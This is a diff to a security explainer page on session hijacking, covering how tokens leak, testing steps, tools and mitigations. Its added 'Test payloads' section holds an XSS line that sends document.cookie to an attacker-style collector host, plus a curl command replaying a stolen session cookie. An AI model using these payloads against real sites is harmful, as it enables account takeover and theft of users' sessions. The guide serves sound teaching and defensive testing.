@@ -1,33 +1,59 @@
 # What is Session Hijacking?
-Session hijacking is a type of cyber attack where an unauthorized person gains control over a user's active session on a website, application, or network service. With control over the session, the attacker can access the user's account, impersonate the user, and perform actions on their behalf without needing to know their username or password.
 
-## How Does Session Hijacking Work?
-- Established Session: When a user logs into a website or application, the server creates a session and assigns a unique session ID to the user's browser. This session ID acts as a temporary authentication token for subsequent interactions.
+Session Hijacking is stealing or predicting a valid session token and using it to impersonate the user, no password required. If you have the token, you are the user for as long as it lives. Tokens leak through XSS, network sniffing on plaintext channels, weak generation, or careless logging.
 
-- Session Identification: Attackers intercept or steal the session ID from the user's browser through various means, such as packet sniffing, session fixation, or cross-site scripting (XSS) attacks.
+## How tokens get stolen
 
-- Session Impersonation: With the stolen session ID, the attacker can masquerade as the legitimate user and effectively take control of their session, bypassing the need for authentication.
+- **XSS** - script reads a non-HttpOnly cookie and ships it out
+- **Sniffing** - session sent over HTTP or mixed content
+- **Predictable IDs** - sequential or low-entropy tokens can be guessed
+- **Leakage** - tokens in URLs, logs, referrers, or error pages
 
-- Unauthorized Access: The attacker can now access the user's account, view sensitive information, make unauthorized transactions, or perform malicious actions on behalf of the user.
+## Test payloads
 
-## Example Scenario
-Imagine Alice is logged into her online banking account, and her session ID is stored in a cookie on her browser. Mallory, an attacker, intercepts Alice's session ID using a packet sniffing tool. Mallory then uses the intercepted session ID to impersonate Alice's session and gain access to her banking account, allowing Mallory to transfer funds or perform other unauthorized actions.
+```javascript
+// XSS payload to exfiltrate a readable cookie
+new Image().src = 'https://attacker.oastify.com/?c=' + document.cookie;
 
-## Impact of Session Hijacking
-- Unauthorized Access: Attackers can gain access to sensitive information or accounts belonging to the hijacked user, potentially leading to data breaches, identity theft, or financial loss.
+// Use a captured token from any client
+// (browser console or curl)
+```
 
-- Impersonation: Session hijacking allows attackers to impersonate legitimate users and carry out malicious activities without being detected, damaging the user's reputation and trust in the affected system.
+```bash
+# Replay a stolen session with curl
+curl https://target.tld/account \
+  -H "Cookie: SESSIONID=stolen_value_here"
+```
 
-- Data Manipulation: Attackers may modify or delete data associated with the hijacked session, leading to data corruption, loss of data integrity, or service disruptions.
+## Tools
 
-## Mitigating Session Hijacking
-- HTTPS Encryption: Use HTTPS protocol to encrypt communication between clients and servers, preventing attackers from intercepting session IDs through packet sniffing or man-in-the-middle attacks.
+- [Burp Suite Sequencer](https://portswigger.net/burp) - measure token randomness/entropy
+- [Wireshark](https://www.wireshark.org/) - spot tokens sent in the clear
+- [mitmproxy](https://mitmproxy.org/) - intercept and replay sessions
 
-- Session Management: Implement secure session management practices, such as using secure cookies, enforcing session expiration, and regenerating session IDs after authentication or important state transitions.
+## Manual testing
 
-- IP Address Validation: Validate session requests based on the user's IP address to detect and prevent session hijacking attempts from unfamiliar or suspicious locations.
+1. Grab a valid session token from your own login
+2. Replay it from a different browser/IP - does it still work?
+3. Check whether the token is `HttpOnly`, `Secure`, and rotated after login
+4. Feed many tokens into Burp Sequencer to check for predictability
+5. Hunt for tokens leaking in URLs, logs, or third-party requests
 
-- Multi-Factor Authentication (MFA): Implement MFA mechanisms, such as SMS codes or authenticator apps, to add an additional layer of security beyond just session IDs.
+## Mitigation
 
-## Conclusion
-Session hijacking is a serious security threat that can lead to unauthorized access, data breaches, and financial losses. By understanding how session hijacking works and implementing appropriate security measures such as HTTPS encryption, secure session management, IP address validation, and MFA, organizations can mitigate the risk of exploitation and protect their users' accounts from malicious attacks. Regular security audits, updates, and user education are essential for maintaining a secure online environment.
+- Cookies must be `HttpOnly`, `Secure`, and `SameSite`
+- Serve everything over HTTPS with HSTS
+- Generate high-entropy, unpredictable tokens
+- Rotate on login, expire on idle, and bind sessions to context
+- Provide server-side logout that truly invalidates the token
+
+## Deep dive
+
+- [Session Hijacking - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
+- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
+
+## CWE
+
+- CWE-384: Session Fixation (related)
+- CWE-613: Insufficient Session Expiration
+- CWE-330: Use of Insufficiently Random Values
